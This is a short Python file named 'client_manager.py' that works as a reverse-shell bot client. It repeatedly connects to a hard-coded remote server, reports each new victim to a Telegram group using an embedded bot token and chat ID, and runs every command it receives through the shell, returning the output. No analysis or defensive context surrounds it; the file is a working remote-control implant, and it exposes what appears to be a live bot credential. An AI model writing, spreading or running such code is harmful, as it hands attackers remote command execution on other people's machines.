# client_manager.py

import socket
import subprocess
import threading
import time

# Configuration
SERVER_IP = 's7.serv00.com'
SERVER_PORT = 63098
BOT_TOKEN = '7847421628:AAGQZJAIiTYlDrgSZjazuWoKhHhKt2zkiXE'
ALLOWED_GROUP_CHAT_ID = -1002303206802

# Function to connect to the server
def connect_to_server(ip, port):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))
            print(f"Connected to server at {ip}:{port}")
            return client_socket
        except Exception as e:
            print(f"Error connecting to server: {e}. Retrying in 2 seconds...")
            time.sleep(2)  # Wait for 2 seconds before retrying

# Function to send commands to the server and execute them locally
def execute_commands(client_socket):
    if client_socket is None:
        print("No connection to the server.")
        return

    # Notify the bot that the server has been added
    from telebot import TeleBot
    bot = TeleBot(BOT_TOKEN)
    bot.send_message(ALLOWED_GROUP_CHAT_ID, "Server add ✅")

    while True:
        try:
            # Receive command from the server
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:
                break

            print(f"Received command: {command}")

            # Execute the command locally
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout, stderr = process.communicate()

            # Send the output back to the server
            response = stdout.decode('utf-8') if stdout else stderr.decode('utf-8')
            client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print(f"Error executing command: {e}")
            break

    client_socket.close()

# Main function
if __name__ == '__main__':
    while True:
        # Connect to the server
        client_socket = connect_to_server(SERVER_IP, SERVER_PORT)

        if client_socket:
            # Start a thread to handle commands
            command_thread = threading.Thread(target=execute_commands, args=(client_socket,))
            command_thread.start()

            # Wait for the thread to finish (in case of disconnection)
            command_thread.join()

            print("Connection lost. Reconnecting...")